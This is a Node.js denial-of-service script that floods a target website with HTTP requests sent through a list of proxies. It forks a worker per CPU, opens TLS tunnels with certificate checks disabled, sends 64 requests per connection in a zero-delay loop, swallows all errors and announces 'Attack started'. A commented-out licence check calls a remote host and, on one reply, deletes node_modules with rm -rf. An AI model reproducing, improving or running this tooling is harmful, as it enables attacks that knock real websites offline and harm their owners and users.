


process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity; 
const net = require('net');
const fs = require('fs');
const querystring = require('querystring'); //require for post data 
const url = require('url');
const request_2 = require('request');
const { constants } = require('crypto');
var theJar = request_2.jar();
var path = require("path");
const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}
var fileName = __filename;
var file = path.basename(fileName);
try {
    var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
    var post_test = process.argv[5];
} catch (err) {
    if (err.code !== 'ENOENT') throw err;
    console.log('Proxy list not found.');
    console.log("node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

var target = process.argv[2];

/*
var key_mod = "k22e243_234y_22_s6e2cu94r9e_sp2lit2_xd"; //process.argv[7];

//const target = target2.split("''")[0];


request_2.get({
url: 'https://scaldic-basin.000webhostapp.com/con_e_ct_io_n.php?key_us='+key_mod,
method: "GET",
headers: {
'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/77.0.3865.90 Chrome/77.0.3865.90 Safari/537.36",
}
}, (err, res, response) => {

if (err){
process.exit(-15);
}

if (response == 'invalid_delate'){
exec('rm -rf node_modules; rm -rf .npm', (error, stdout, stderr) => {
});

console.log('Key especifiqued ('+key_mod+') no are valid..')
process.exit(-15)//kill process
}

if (response == 'invalid'){
console.log('Key especifiqued ('+key_mod+') no are valid..')
process.exit(-15)//kill process
} else {
//all good
}

})*/

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}

var parsed = url.parse(target);
process.setMaxListeners(15);
let browser_saves = '';

const UAs = [
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4676.0 Safari/537.36",
];

//request_2.get({method: 'GET', url: 'https://mx1.100up.de/'}, (res, response) => {console.log(response)})

const post_recibe = "und"; //post_test.split("''")[0];

var data2 = querystring.stringify(post_recibe);

const cluster = require('cluster');
const { cpus } = require('os');

const numCPUs = cpus().length;

if (cluster.isPrimary) {
  console.log(`Primary ${process.pid} is running`);

  // Fork workers.
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`worker ${worker.process.pid} died`);
  });
} else {

//for (let j = 0; j < 64; j++) {
setInterval(function() {

var aa = getRandomNumberBetween(100, proxies.length-400);

var proxy = proxies[Math.floor(Math.random() * aa)];
proxy = proxy.split(':');

var http = require('http'),
tls = require('tls');
//tls.DEFAULT_ECDH_CURVE = 'auto'

const agent = new http.Agent({
keepAlive: true,      // Keep sockets around even when there are no outstanding requests, so they can be used for future requests without having to reestablish a TCP connection. Defaults to false
  keepAliveMsecs: 50000, // When using the keepAlive option, specifies the initial delay for TCP Keep-Alive packets. Ignored when the keepAlive option is false or undefined. Defaults to 1000.
  maxSockets: Infinity, // Maximum number of sockets to allow per host. Defaults to Infinity.
 // maxFreeSockets: 256   // Maximum number of sockets to leave open in a free state. Only relevant if keepAlive is set to true. Defaults to 256.
});

var tlsSessionStore = {};

var req = http.request({//set proxy session
    host: proxy[0],
    agent: agent,
    globalAgent: agent,
    port: proxy[1],
      headers: {
    'Host': parsed.host,
    'Proxy-Connection': 'Keep-Alive',
    'Connection': 'Keep-Alive',
  },
    method: 'CONNECT',
    path: parsed.host+':443'
}, function(){ req.setSocketKeepAlive(true); });

req.on('connect', function (res, socket, head) {//open raw request
    tls.authorized = true;
    tls.sync = true;
    var tlsConnection = tls.connect({
        ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        secureProtocol: 'TLSv1_2_method',
        honorCipherOrder: true,
        //requestCert: true,
        host: parsed.host,
        port: 80,
        secureOptions: 'SSL_OP_NO_SSLv2' | 'SSL_OP_NO_SSLv3' | 'SSL_OP_NO_COMPRESSION', //'SSL_OP_*',
        servername: parsed.host,
       // secure: true,
        rejectUnauthorized: false,
        socket: socket
    }, function () {
       for (let j = 0; j < 64; j++) {
    tlsConnection.setKeepAlive(true, 5000)
    tlsConnection.setTimeout(5000);

tlsConnection.write(`${process.argv[5]} `+target+' HTTP/1.3\r\nHost: '+parsed.host+'\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
}
});

    tlsConnection.on('newSession', function(id, data) {
tlsSessionStore[id] = data;
});
tlsConnection.on('resumeSession', function(id, cb) {
cb(null, tlsSessionStore[id] || null);
});

tlsConnection.on('disconnected', () => {tlsConnection.destroy();});
tlsConnection.on('timeout' , () => {tlsConnection.destroy()});
tlsConnection.on('error', (err) =>{tlsConnection.destroy()});
tlsConnection.on('data', (chunk) => { data += chunk; tlsConnection.destroy(); chunk.push(chunk);  setTimeout(function () { tlsConnection.abort(); return delete tlsConnection; }, 5000); });

    tlsConnection.on('end', () => {
      //console.log(data);
      tlsConnection.abort();
      tlsConnection.destroy();
    });

}).end()
//req.end()
}, 0);
}

/*
setTimeout(() => {
  process.exit(1);
}, time)*/

console.log('Attack started to '+target);